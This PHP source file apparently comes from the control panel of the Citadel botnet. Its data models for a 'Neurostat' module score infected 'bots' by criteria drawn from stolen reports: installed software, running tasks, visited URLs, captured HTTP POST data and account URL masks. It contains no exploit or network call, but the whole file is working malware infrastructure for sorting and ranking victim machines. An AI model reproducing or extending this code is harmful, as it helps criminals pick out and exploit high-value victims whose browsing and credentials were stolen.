<?php namespace Citadel\Models;

use Amiss;
use lib\fun\NeuroStat;

/** Neurostat profile
 * This defines a named set of criteria
 * @table neurostat_profiles
 */
class NeurostatProfile {
    /** Profile ID, PK
     * @primary
     * @type autoinc
     * @var int
     */
    public $pid;

    /** Profile name
     * @field
     * @type varchar(128) not null
     * @var string
     */
    public $name;

    /** Member criteria list
     * @field
     * @type serialized not null
     * @var int[]
     */
    public $criteria;

    /** Get the available criteria options:
     * array( cid => Title )
     * @return array
     */
    static function criteria_options(Amiss\Manager $manager){
        $options = array();
        foreach ($manager->getList('NeurostatCriterion', array('order'=>'title')) as $criterion) /** @var NeurostatCriterion $criterion */
            $options[$criterion->cid] = $criterion->title;
        return $options;
    }

    /** Load criteria objects from $criteria
     * @return NeurostatCriterion[]
     * @return NeurostatCriterion[]
     */
    function criteria(\Amiss\Manager $manager){
        if (empty($this->criteria))
            return array();
        return $manager->getList('NeurostatCriterion', '{cid} IN (:cids)', array(':cids' => $this->criteria));
    }

    /** Analyses run on this profile
     * @has many of=NeurostatAnalysis
     * @var NeurostatAnalysis[]
     */
    public $analyses;
}



/** Neurostat criteria
 * Refers to a className and defines some settings
 * @table neurostat_criteria
 */
class NeurostatCriterion {
    /** Criterion id
     * @primary
     * @type autoinc
     * @var int
     */
    public $cid;

    /** Type, meaning, criterion className in namespace `self::TYPE_NAMESPACE`
     * @field
     * @type varchar(255) not null
     * @var string
     */
    public $type;

    const TYPE_NAMESPACE = '\lib\fun\NeuroStat\Criteria';

    /** Get all criteria `type` options:
     * array( className => Name )
     * @return array
     */
    static function type_options(){
        $ret = array();
        foreach (array(
                     'BotFirstReport',
                     'BotLastReport',
                     'BotWeeklyOnline',
                     'ReportType',
                     'ReportContents',
                     'InstalledSoftware',
                     'TaskList',
                     'ReportHttp_VisitUrl',
                     'ReportHttp_POST',
                 ) as $className){
            $fullClassName = static::TYPE_NAMESPACE.'\\'.$className;
            $name = $fullClassName::NAME;
            $ret[$className] = $name;
        }
        return $ret;
    }

    /** Title, user-specified
     * @field
     * @type varchar(255) not null
     * @var string
     */
    public $title = '';

    /** Instance settings
     * @field
     * @type serialized not null
     * @var array
     */
    public $sets = array();

    /** Points given when the criterion is met
     * @field
     * @type tinyint not null
     * @var int
     */
    public $points = 0;

    /** Is the criterion negated.
     * `true` means the criterion produces $points when it's not met
     * @field
     * @type bool not null
     * @var bool
     */
    public $negated = false;

    /** Data analyzis age limit, days. `null` means no limit.
     * Precisely, this is the age limit on the reports table.
     * (!) Used only by AReportCriterion
     * @field
     * @type int unsigned null
     * @var int|null
     */
    public $days_limit;

    /** (counting) Statistical method name:
     * - null: The criterion produces $points for each report matched
     * - !null: The criterion produces $points if the aggregated results meets the provided statistical method's criteria
     *
     * - "sum": aggregated result = SUM(number of matched reports)
     * - "days": aggregated result = COUNT(days with matching reports)
     * - "avg/day": aggregared result = AVG(number of matched reports per day)
     * - "avg/week": aggregated result = AVG(number of matched reports per week)
     * - "days/week": aggregated result = AVG(number of days containing the matched report per week)
     * (!) Used only by AReportCriterion
     * @field
     * @type varchar(16) null
     * @var string|null
     */
    public $c_stat;

    /** Get the available statistical methods
     * array( method-name => name )
     * @return string[]
     */
    static function c_stat_options(){
        return array(
            null        => LNG_NEUROSTAT_CRITERION_STAT__NO,
            'sum'       => LNG_NEUROSTAT_CRITERION_STAT__SUM,
            'days'      => LNG_NEUROSTAT_CRITERION_STAT__DAYS,
            'avg/day'   => LNG_NEUROSTAT_CRITERION_STAT__AVG_DAY,
            'avg/week'  => LNG_NEUROSTAT_CRITERION_STAT__AVG_WEEK,
            'days/week' => LNG_NEUROSTAT_CRITERION_STAT__DAYS_WEEK,
        );
    }

    /** (counting) Condition operator to compare the aggregated result with the threshold
     * One of: "<", "<=", "=", ">=", ">"
     * (!) Used only by AReportCriterion, when $c_stat is given
     * @field
     * @type varchar(2) null
     * @var string|null
     */
    public $c_operator;

    /** Get the available operator options
     * array( operator => operator )
     * @return string[]
     */
    static function c_operator_options(){
        $a = array('<', '<=', '=', '>=', '>');
        return array_combine($a, $a);
    }

    /** (counting) Threshold value to compare the aggregated results with
     * (!) Used only by AReportCriterion, when $c_stat is given
     * @field
     * @type int unsigned null
     * @var int|null
     */
    public $c_threshold;

    /** Instantiate the Criterion implementation
     * @return NeuroStat\Criteria\ACriterion
     */
    function getCriterion(Amiss\Manager $manager){
        $className = static::TYPE_NAMESPACE.'\\'.$this->type;
        $criterion = new $className($this, $manager);
        return $criterion;
    }
}



/** A single analysis
 * @table neurostat_analyses
 */
class NeurostatAnalysis {
    /** Analysis ID, PK
     * @primary
     * @type autoinc
     * @var int
     */
    public $aid;

    /** Analysis name
     * @field
     * @type varchar(255) not null
     * @var string
     */
    public $name;

    /** If this analysis is about to handle a single specific botID - that's it
     * @field
     * @type varchar(100) not null
     * @var string|null
     */
    public $single_botid;

    /** Profiles to include in this analysis
     * @field
     * @type serialized not null
     * @var int[]
     */
    public $profiles;

    /** Get the available profiles options:
     * array( pid => Name )
     * @return array
     */
    static function profiles_options(Amiss\Manager $manager){
        $options = array();
        foreach ($manager->getList('NeurostatProfile') as $profile) /** @var NeurostatProfile $profile */
            $options[$profile->pid] = $profile->name;
        return $options;
    }

    /** Load profile objects from $profiles
     * @return NeurostatProfile[]
     */
    function profiles(Amiss\Manager $manager){
        if (empty($this->profiles))
            return $this->profiles;
        return $manager->getList('NeurostatProfile', '{pid} IN (:pids)', array(':pids' => $this->profiles));
    }

    /** The number of days to analyze
     * @field
     * @type smallint unsigned not null
     * @var int
     */
    public $days = 7;

    /** Limit the analysis to bots which were online during the last X days
     * @field
     * @type smallint unsigned null
     * @var int|null
     */
    public $botonline = 7;

    /** Ignore today's reports table to prevent table locking
     * @field
     * @type bool not null
     * @var bool
     */
    public $notoday = 0;

    /** URL mask wildcard.
     * Is used to limit the analysis to bots that have matching reports.
     * @field
     * @type serialized not null
     * @var array {{ urls: Array.<String> }}
     */
    public $account = array(
        'urls' => null
    );

    /** Last launch date
     * @field
     * @type datetime null
     * @var \DateTime
     */
    public $launched;

    /** Analysis state
     * @field
     * @type serialized null
     * @var null|NeuroStat\AnalysisProgress
     */
    public $state;

    /** First analyzed report reference
     * @field
     * @type report_ref null
     * @var int[2] "yymmdd:report_id"
     */
    public $report_first;

    /** Last analyzed report reference
     * @field
     * @type report_ref null
     * @var int[2] "yymmdd:report_id"
     */
    public $report_last;

    /** Instantiate the AnalysisProcessor implementation
     * @return NeuroStat\AnalysisProcessor
     */
    function getAnalysisProcessor(){
        return new NeuroStat\AnalysisProcessor($this);
    }
}



/** Analysis data: Bots
 * @table neurostat_analysis_bots
 */
class NeurostatAnalysisBot {
    /** Analysis ID
     * @field
     * @type int unsigned not null
     * @var int
     */
    public $aid;

    /** The analysis object
     * @has one of=NeurostatAnalysis; on=aid
     * @var NeurostatAnalysis
     */
    public $analysis;

    /** Bot Id
     * @field
     * @type varchar(100) not null
     * @var string
     */
    public $botId;

    /** The analysis object
     * @has one of=Bot; on=botId
     * @var Bot
     */
    public $bot;

    /** Bot Id, speed-up integer
     * @field
     * @type autoinc
     * @var int
     */
    public $bid;

    /** Accounts that made this bot match.
     * A mapping from the account mask to report reference
     * @field
     * @type serialized null
     * @var object
     */
    public $accounts;

    /** Scored points
     * @field
     * @type int null
     * @var int|null
     */
    public $points;

    /** Score details: a mapping { cid: points }
     * @field
     * @type serialized null
     * @var array|null
     */
    public $details;
}



/** Analysis data for a single bot for a single date
 * @table neurostat_analysis_data
 */
class NeurostatAnalysisData {
    /** Analysis ID
     * @field
     * @type int unsigned not null
     * @var int
     */
    public $aid;

    /** The analysis object
     * @has one of=NeurostatAnalysis; on=aid
     * @var NeurostatAnalysis
     */
    public $analysis;

    /** Bot Id, speed-up integer
     * @field
     * @type int unsigned not null
     * @var int
     */
    public $bid;

    /** Matched bot
     * @has one of=NeurostatAnalysisBots; on=bid
     * @var NeurostatAnalysisBots
     */
    public $bot;

    /** Matched criterion
     * @field
     * @type int unsigned not null
     * @var int
     */
    public $cid;

    /** Reports matching date.
     * For bot criteria matches, the date is set to "0000-00-00"
     * @field
     * @type date not null
     * @var \DateTime
     */
    public $date;

    /** List of report references that matched the criterion, "\n"-separated
     * @field
     * @type serialized not null
     * @var string[]
     */
    public $reports;

    /** Matched reports count
     * @field
     * @type int unsigned not null
     * @var int
     */
    public $reports_count;
}
